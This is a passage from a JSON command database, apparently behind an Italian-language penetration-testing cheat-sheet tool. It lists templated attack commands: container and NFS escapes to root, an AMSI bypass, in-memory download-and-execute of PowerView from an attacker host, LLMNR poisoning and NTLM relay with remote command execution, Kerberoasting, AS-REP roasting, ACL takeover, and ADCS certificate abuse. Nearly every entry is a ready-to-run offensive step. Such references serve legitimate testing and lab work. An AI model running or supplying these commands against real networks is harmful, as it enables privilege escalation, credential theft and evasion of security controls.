    "group": "Linux",
    "description": "Se sei nel gruppo `docker` o `lxd` puoi montare il filesystem host dentro un container privilegiato e diventare root.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [],
    "tags": [
      "docker",
      "lxd",
      "escape"
    ],
    "template": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "docker",
        "template": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "description": "Monta `/` host nel container e fai `chroot`."
      },
      {
        "id": "lxd",
        "label": "lxd",
        "template": "lxc init alpine privesc -c security.privileged=true; lxc config device add privesc host-root disk source=/ path=/mnt/root; lxc start privesc; lxc exec privesc /bin/sh",
        "description": "Container privilegiato con `/` host montato in `/mnt/root`."
      }
    ]
  },
  {
    "id": "nfs-rootsquash",
    "name": "NFS no_root_squash → root",
    "category": "privesc",
    "subcategory": "container-escape",
    "group": "Host Escape",
    "description": "Se un export in `/etc/exports` ha `no_root_squash`, monta la share da attacker (come root), crea una bash `SUID`, poi eseguila sul target.",
    "platform": "linux",
    "requires": [
      "shell"
    ],
    "protocols": [
      "nfs"
    ],
    "tags": [
      "nfs",
      "no_root_squash",
      "suid"
    ],
    "template": "sudo mount -t nfs <ip>:<share> /mnt/nfs; sudo cp /bin/bash /mnt/nfs/bash; sudo chmod +s /mnt/nfs/bash",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "/home/user"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Crea SUID (attacker)",
        "template": "sudo mount -t nfs <ip>:<share> /mnt/nfs; sudo cp /bin/bash /mnt/nfs/bash; sudo chmod +s /mnt/nfs/bash",
        "description": "Monti come root e pianti una bash `SUID` nella share."
      },
      {
        "id": "exec",
        "label": "Esegui (target)",
        "template": "/mnt/nfs/bash -p",
        "description": "Dal target: la bash `SUID` con `-p` mantiene l’UID 0 → root."
      }
    ]
  },
  {
    "id": "ad-setup",
    "name": "Setup — script in memoria / AMSI / Kerberos",
    "category": "active-directory",
    "subcategory": "setup",
    "group": "Pre-Reqs",
    "description": "Pre-requisiti AD: bypassare AMSI, caricare gli script in memoria e, se NTLM è disabilitato, preparare Kerberos puntando al FQDN del DC.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "amsi",
      "kerberos",
      "setup"
    ],
    "template": "IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/PowerView.ps1')",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Carica script (IEX)",
        "template": "IEX(New-Object Net.WebClient).DownloadString('http://<lhost>/PowerView.ps1')",
        "description": "Carica `PowerView`/`SharpHound` in memoria, senza scrivere su disco."
      },
      {
        "id": "amsi",
        "label": "AMSI bypass",
        "template": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "description": "Eseguilo PRIMA di caricare gli script PowerShell."
      },
      {
        "id": "krb5",
        "label": "Kerberos (NTLM off)",
        "template": "nxc smb <ip> -u <user> -p <password> -k --generate-krb5-file /etc/krb5.conf",
        "description": "Genera `krb5.conf` (FQDN del DC deve risolvere; sincronizza l’orologio col DC)."
      }
    ]
  },
  {
    "id": "bloodhound-py",
    "name": "bloodhound.py — collect completo",
    "category": "active-directory",
    "subcategory": "enumeration",
    "group": "BloodHound",
    "description": "Raccoglie da Linux tutti i dati per BloodHound. `-c all` usa ogni metodo di raccolta; `--zip` crea l’archivio da importare.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "smb"
    ],
    "tags": [
      "bloodhound",
      "collector"
    ],
    "template": "bloodhound-python -u <user> -p <password> -d <domain> -ns <ip> -c all --zip",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-ad-enum",
    "name": "nxc ldap — enum dominio",
    "category": "active-directory",
    "subcategory": "enumeration",
    "group": "LDAP",
    "description": "Enumera il dominio in un colpo: utenti, gruppi e password policy. `--asreproast`/`--kerberoasting` estraggono gli hash direttamente.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "nxc",
      "netexec",
      "ldap",
      "roasting"
    ],
    "template": "nxc ldap <ip> -u '<user>' -p '<password>' --users --groups",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Utenti & gruppi",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' --users --groups",
        "description": "Elenco utenti e gruppi di dominio."
      },
      {
        "id": "asrep",
        "label": "ASREPRoast",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' --asreproast asrep.txt",
        "description": "Estrae gli hash AS-REP degli utenti senza pre-auth."
      },
      {
        "id": "kerb",
        "label": "Kerberoast",
        "template": "nxc ldap <ip> -u '<user>' -p '<password>' --kerberoasting kerb.txt",
        "description": "Estrae i TGS degli account con SPN."
      }
    ]
  },
  {
    "id": "ldapdomaindump",
    "name": "ldapdomaindump — dump HTML",
    "category": "active-directory",
    "subcategory": "enumeration",
    "group": "LDAP",
    "description": "Dump completo LDAP in HTML/JSON navigabile (utenti, gruppi, computer, policy): comodo per una vista d’insieme offline.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "ldapdomaindump",
      "ldap"
    ],
    "template": "ldapdomaindump -u '<domain>\\<user>' -p '<password>' <ip> -o ldapdump",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "adidnsdump",
    "name": "adidnsdump — DNS interno via LDAP",
    "category": "active-directory",
    "subcategory": "enumeration",
    "group": "LDAP",
    "description": "Estrae tutti i record della zona ADIDNS interrogando LDAP: rivela host interni e servizi che non compaiono altrove. Con `-r` risolve anche i record il cui nome non è leggibile direttamente.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "dns"
    ],
    "tags": [
      "adidnsdump",
      "dns",
      "enumeration"
    ],
    "template": "adidnsdump -u '<domain>\\<user>' -p '<password>' ldap://<ip>",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Dump zona",
        "template": "adidnsdump -u '<domain>\\<user>' -p '<password>' ldap://<ip>",
        "description": "Elenca i record DNS del dominio in `records.csv`."
      },
      {
        "id": "resolve",
        "label": "Risolvi nascosti",
        "template": "adidnsdump -u '<domain>\\<user>' -p '<password>' ldap://<ip> -r",
        "description": "Prova a risolvere anche i record senza nome leggibile con una query A diretta."
      }
    ],
    "refs": [
      {
        "label": "dirkjanm — adidnsdump",
        "url": "https://github.com/dirkjanm/adidnsdump"
      }
    ]
  },
  {
    "id": "ad-recycle-bin",
    "name": "AD Recycle Bin — oggetti eliminati",
    "category": "active-directory",
    "subcategory": "enumeration",
    "group": "Recycle Bin",
    "description": "Enumera e ripristina gli account eliminati. Serve quando un template ADCS mostra Enrollment Rights per un SID senza nome (account cancellato): lo ripristini e sblocchi il path. Il restore richiede il diritto `DS-Reanimate-Tombstones`.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "recycle-bin",
      "deleted-objects",
      "tombstone"
    ],
    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable --include-del",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Account da ripristinare",
        "placeholder": "old_svc"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (bloodyAD)",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' get writable --include-del\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set restore <target>",
        "description": "Trovi gli oggetti eliminati, poi ripristini il target: recupera tutti i suoi gruppi e permessi."
      },
      {
        "id": "windows",
        "label": "Windows (AD module)",
        "template": "Get-ADObject -Filter {isDeleted -eq $true -and objectClass -eq 'user'} -IncludeDeletedObjects -Properties *\nGet-ADObject -Filter {Name -like '<target>'} -IncludeDeletedObjects | Restore-ADObject",
        "description": "Enum e restore da Windows. Serve il diritto `DS-Reanimate-Tombstones`."
      }
    ],
    "refs": [
      {
        "label": "bloodyAD — wiki",
        "url": "https://github.com/CravateRouge/bloodyAD/wiki"
      }
    ]
  },
  {
    "id": "kerbrute-userenum",
    "name": "kerbrute — user enum",
    "category": "active-directory",
    "subcategory": "enumeration",
    "group": "User Enumeration",
    "description": "Valida gli username via Kerberos senza bloccare account: non genera eventi `4625` (pre-auth probe).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "kerbrute",
      "kerberos"
    ],
    "template": "kerbrute userenum -d <domain> --dc <ip> <userlist>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "userlist",
        "label": "Userlist",
        "placeholder": "users.txt"
      }
    ]
  },
  {
    "id": "responder",
    "name": "Responder — LLMNR/NBT-NS poisoning",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "Poisoning",
    "description": "Avvelena le query LLMNR/NBT-NS/MDNS e cattura i NetNTLMv2 di chi cerca host inesistenti. Hash in `/usr/share/responder/logs/`, crack con hashcat `-m 5600`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ntlm"
    ],
    "tags": [
      "responder",
      "llmnr",
      "netntlmv2"
    ],
    "template": "responder -I <iface> -w",
    "params": [
      {
        "key": "iface",
        "label": "Interfaccia",
        "placeholder": "tun0"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Poison",
        "template": "responder -I <iface> -w",
        "description": "Ascolta e avvelena. Per il relay disabilita SMB/HTTP in `Responder.conf`."
      },
      {
        "id": "analyze",
        "label": "Analyze",
        "template": "responder -I <iface> -A",
        "description": "Modalità passiva: osserva senza avvelenare (ricognizione)."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — LLMNR/NBT-NS poisoning",
        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html"
      }
    ]
  },
  {
    "id": "ntlmrelayx-smb",
    "name": "ntlmrelayx — relay SMB",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "NTLM Relay",
    "description": "Rilancia l’auth NTLM catturata verso host SENZA SMB signing (`nxc smb <range> --gen-relay-list`). `-i` apre una shell SMB interattiva, `-c` esegue un comando.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "smb",
      "ntlm"
    ],
    "tags": [
      "impacket",
      "ntlmrelayx",
      "relay"
    ],
    "template": "ntlmrelayx.py -tf targets.txt -smb2support -i",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Shell interattiva",
        "template": "ntlmrelayx.py -tf targets.txt -smb2support -i",
        "description": "Apre una shell SMB sul target relayato (`nc 127.0.0.1 11000`)."
      },
      {
        "id": "exec",
        "label": "Esegui comando",
        "template": "ntlmrelayx.py -tf targets.txt -smb2support -c \"powershell -enc <b64>\"",
        "description": "Esegue un comando sul target relayato."
      }
    ]
  },
  {
    "id": "getnpusers",
    "name": "GetNPUsers.py — AS-REP roast",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "AS-REP Roasting",
    "description": "Richiede gli AS-REP degli utenti senza pre-auth Kerberos. Crack con hashcat `-m 18200`. Senza credenziali serve una lista di username.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "impacket",
      "asrep"
    ],
    "template": "GetNPUsers.py <domain>/ -usersfile <userlist> -dc-ip <ip> -no-pass -outputfile asrep.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "userlist",
        "label": "Userlist",
        "placeholder": "users.txt"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "getuserspns",
    "name": "GetUserSPNs.py — Kerberoast",
    "category": "active-directory",
    "subcategory": "initial-access",
    "group": "Kerberoasting",
    "description": "Richiede i TGS di tutti gli account con SPN configurato. Crack con hashcat `-m 13100`. Gli account di servizio hanno spesso password deboli.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "impacket",
      "kerberoast"
    ],
    "template": "GetUserSPNs.py <domain>/<user>:<password> -dc-ip <ip> -request -outputfile kerb.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "acl-abuse",
    "name": "ACL abuse — bloodyAD",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Sfrutta i diritti ACL trovati in BloodHound. `ForceChangePassword`/`GenericAll` → reset password; `GenericWrite` → Shadow Credentials (no reset); `AddMember` → aggiunta a gruppo.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "bloodyad",
      "acl",
      "shadow-credentials"
    ],
    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set password <target> 'NewP@ss123!'",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Oggetto target",
        "placeholder": "svc_admin"
      },
      {
        "key": "group",
        "label": "Gruppo",
        "placeholder": "Domain Admins"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "ForceChangePassword",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set password <target> 'NewP@ss123!'",
        "description": "Resetta la password del target senza conoscere quella attuale."
      },
      {
        "id": "shadow",
        "label": "Shadow Credentials",
        "template": "certipy shadow auto -u '<user>@<domain>' -p '<password>' -account <target> -dc-ip <ip>",
        "description": "`GenericWrite`: aggiunge `msDS-KeyCredentialLink` e recupera l’NT hash, senza toccare la password."
      },
      {
        "id": "addmember",
        "label": "AddMember",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add groupMember '<group>' <target>",
        "description": "Aggiunge un utente a un gruppo su cui hai `AddMember`/`GenericAll`."
      }
    ]
  },
  {
    "id": "acl-writeowner",
    "name": "WriteOwner — diventa owner e concediti i diritti",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Con `WriteOwner` su un oggetto ti imposti come suo owner, poi da owner ti concedi `GenericAll` e lo sfrutti come un normale ACL abuse (reset password, aggiunta a gruppo). Ricorda il cleanup finale.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "bloodyad",
      "acl",
      "writeowner"
    ],
    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set owner <target> <user>",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Oggetto target",
        "placeholder": "svc_admin"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "bloodyAD",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set owner <target> <user>\n\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add genericAll <target> <user>",
        "description": "Diventi owner del target, poi ti concedi `GenericAll`. Da lì lo abusi come un normale ACL (reset password, add member)."
      },
      {
        "id": "impacket",
        "label": "owneredit + dacledit",
        "template": "owneredit.py -action write -new-owner <user> -target <target> '<domain>/<user>:<password>'\ndacledit.py -action write -rights FullControl -principal <user> -target <target> '<domain>/<user>:<password>'",
        "description": "Cambi owner con `owneredit.py`, poi ti concedi FullControl con `dacledit.py`."
      }
    ],
    "refs": [
      {
        "label": "The Hacker Recipes — Grant ownership",
        "url": "https://www.thehacker.recipes/ad/movement/dacl/grant-ownership"
      }
    ]
  },
  {
    "id": "targeted-kerberoast",
    "name": "Targeted Kerberoast — SPN via GenericWrite",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Con `GenericWrite` su un utente senza SPN gli aggiungi un SPN fittizio, richiedi il suo TGS, lo cracki offline e poi rimuovi l'SPN. `targetedKerberoast.py` automatizza tutto il ciclo. Crack con hashcat `-m 13100`.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "kerberos"
    ],
    "tags": [
      "kerberoast",
      "genericwrite",
      "targetedkerberoast"
    ],
    "template": "targetedKerberoast.py -d <domain> -u <user> -p '<password>' --dc-ip <ip>",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Utente target",
        "placeholder": "svc_user"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Automatico",
        "template": "targetedKerberoast.py -d <domain> -u <user> -p '<password>' --dc-ip <ip>",
        "description": "Aggiunge un SPN a ogni utente su cui hai scrittura, dumpa i TGS e rimuove l'SPN. `--request-user <target>` per un solo utente."
      },
      {
        "id": "manual",
        "label": "Manuale (bloodyAD)",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <target> servicePrincipalName -v 'fake/spn'\nimpacket-GetUserSPNs <domain>/<user>:'<password>' -dc-ip <ip> -request-user <target>\n# cleanup: rimuovi lo SPN\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set object <target> servicePrincipalName",
        "description": "Aggiungi l'SPN fittizio, richiedi il TGS, poi rimuovi l'SPN. Crack con hashcat `-m 13100`."
      }
    ],
    "refs": [
      {
        "label": "ShutdownRepo — targetedKerberoast",
        "url": "https://github.com/ShutdownRepo/targetedKerberoast"
      }
    ]
  },
  {
    "id": "targeted-asrep",
    "name": "Targeted ASREP Roast — disabilita pre-auth",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ACL Abuse",
    "description": "Con `GenericWrite` su un utente gli togli il flag di pre-autenticazione (`DONT_REQ_PREAUTH`), richiedi il suo hash AS-REP, lo cracki e poi rimetti il flag. Crack con hashcat `-m 18200`.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "kerberos"
    ],
    "tags": [
      "asreproast",
      "genericwrite",
      "uac"
    ],
    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add uac <target> DONT_REQ_PREAUTH",
    "params": [
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "target",
        "label": "Utente target",
        "placeholder": "svc_user"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Linux (bloodyAD)",
        "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add uac <target> DONT_REQ_PREAUTH\n\nimpacket-GetNPUsers <domain>/<target> -dc-ip <ip> -no-pass -format hashcat\n\n# cleanup: rimetti la pre-auth\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' remove uac <target> DONT_REQ_PREAUTH",
        "description": "Togli la pre-auth, prendi l'AS-REP e rimettila. Crack con hashcat `-m 18200`."
      },
      {
        "id": "powerview",
        "label": "Windows (PowerView)",
        "template": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose\n\n.\\Rubeus.exe asreproast /user:<target> /format:hashcat /nowrap\n\nSet-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose",
        "description": "Da Windows: flippi il bit `DONT_REQ_PREAUTH`, roast con Rubeus, poi riflippi (XOR di nuovo) per il cleanup."
      }
    ],
    "refs": [
      {
        "label": "The Hacker Recipes — ASREProast",
        "url": "https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
      }
    ]
  },
  {
    "id": "certipy-find",
    "name": "Certipy — template vulnerabili",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS — Recon",
    "description": "Enumera CA e template ADCS segnalando i vulnerabili (`ESC1`-`ESC15`). `-vulnerable -stdout` per il riepilogo rapido.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "rpc"
    ],
    "tags": [
      "certipy",
      "adcs",
      "esc1"
    ],
    "template": "certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -vulnerable -stdout",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "Certipy — GitHub",
        "url": "https://github.com/ly4k/Certipy"
      },
      {
        "label": "SpecterOps — Certified Pre-Owned (ADCS)",
        "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
      }
    ]
  },
  {
    "id": "certipy-req",
    "name": "Certipy — richiedi cert (ESC1)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS — ESC1",
    "description": "Su un template vulnerabile a ESC1, richiede un certificato con SAN arbitrario (`-upn administrator@...`): poi ti autentichi come quell’utente.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap",
      "rpc"
    ],
    "tags": [
      "certipy",
      "esc1"
    ],
    "template": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn '<upn>'",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "ca",
        "label": "CA",
        "placeholder": "CORP-CA"
      },
      {
        "key": "template",
        "label": "Template",
        "placeholder": "ITAdmins"
      },
      {
        "key": "upn",
        "label": "SAN UPN",
        "placeholder": "administrator@corp.local"
      }
    ]
  },
  {
    "id": "certipy-auth",
    "name": "Certipy — auth PKINIT",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS — ESC1",
    "description": "PKINIT col `.pfx` ottenuto: restituisce un TGT e l’NT hash dell’utente impersonato (via U2U).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "kerberos"
    ],
    "tags": [
      "certipy",
      "pkinit"
    ],
    "template": "certipy auth -pfx <pfx> -dc-ip <ip>",
    "params": [
      {
        "key": "pfx",
        "label": "PFX file",
        "placeholder": "administrator.pfx"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "ntlmrelayx-adcs",
    "name": "ntlmrelayx — relay ADCS Web (ESC8)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "ADCS — ESC8",
    "description": "Rilancia l’auth NTLM forzata verso l’endpoint web ADCS (`/certsrv`) ed emette un certificato a nome della vittima (ESC8). Da combinare con `coercer`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http",
      "ntlm"
    ],
    "tags": [
      "impacket",
      "ntlmrelayx",
      "esc8"
    ],
    "template": "ntlmrelayx.py -t http://<ip>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
    "params": [
      {
        "key": "ip",
        "label": "ADCS",
        "ctx": "ip",
        "placeholder": "10.10.10.21"
      }
    ]
  },
  {
    "id": "coercer",
    "name": "Coercer — forza autenticazione",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Coercion",
    "description": "PetitPotam / MS-RPRN / DFSCoerce: forza un computer (DC) ad autenticarsi verso il tuo listener. Combinalo con un relay verso ADCS o LDAP.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "rpc",
      "smb"
    ],
    "tags": [
      "coercer",
      "petitpotam"
    ],
    "template": "coercer coerce -u '<user>' -p '<password>' -d '<domain>' -t <ip> -l <attacker>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "ip",
        "label": "Victim",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "attacker",
        "label": "Listener",
        "placeholder": "10.10.14.5"
      }
    ]
  },
  {
    "id": "addcomputer",
    "name": "addcomputer.py — crea computer (RBCD)",
    "category": "active-directory",
    "subcategory": "priv-esc",
    "group": "Delegation (RBCD)",
    "description": "Sfrutta il `MachineAccountQuota` (default 10) per creare un computer account che controlli: prerequisito per RBCD.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "ldap"
    ],
    "tags": [
      "impacket",
      "maq",
      "rbcd"
    ],
    "template": "addcomputer.py -computer-name '<newhost>$' -computer-pass '<newpass>' -dc-ip <ip> '<domain>/<user>:<password>'",
    "params": [
      {
        "key": "newhost",
        "label": "New host",
        "placeholder": "ATK01"
      },
      {
        "key": "newpass",
        "label": "Password",
        "placeholder": "Atk01Pass!"
      },
      {
        "key": "ip",
        "label": "DC IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
